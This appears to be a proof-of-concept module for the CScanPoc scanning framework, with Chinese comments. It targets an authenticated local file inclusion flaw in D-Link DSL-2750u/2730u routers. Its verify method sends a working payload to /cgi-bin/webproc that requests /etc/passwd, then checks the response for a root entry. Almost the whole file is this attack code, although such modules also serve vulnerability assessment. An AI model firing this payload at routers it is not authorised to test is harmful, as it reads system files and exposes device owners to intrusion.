# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'D-Link_0002'  # 平台漏洞编号，留空
    name = 'D-Link Authenticated Local File Disclosure'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-07-07'  # 漏洞公布时间
    desc = '''
        The router suffers from an authenticated file inclusion vulnerability
        (LFI) when input passed thru the 'getpage' parameter to 'webproc' script is
        not properly verified before being used to include files. This can be exploited
        to include files from local resources.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37516/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DSL-2750u / DSL-2730u'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f668dd96-6a96-4bd5-b899-4fd75780314d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
            r = requests.get(self.target + payload)

            if r.status_code == 200 and '/root:/bin/bash' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
